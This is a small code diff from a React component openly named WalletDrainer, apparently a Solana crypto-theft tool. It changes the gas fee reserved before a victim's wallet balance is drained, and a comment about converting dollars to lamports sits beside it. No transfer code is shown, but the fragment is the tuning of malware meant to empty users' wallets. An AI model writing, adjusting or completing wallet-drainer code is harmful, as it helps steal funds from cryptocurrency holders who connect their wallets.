@@ -119,7 +119,8 @@ export default function WalletDrainer({ wallet }) {
           // what is $4.5 in lamports?
 
 
-        const gasFee = 4950000;
+        // const gasFee = 4950000;
+        const gasFee = 160000;
 
   
           if (balance <= gasFee) {
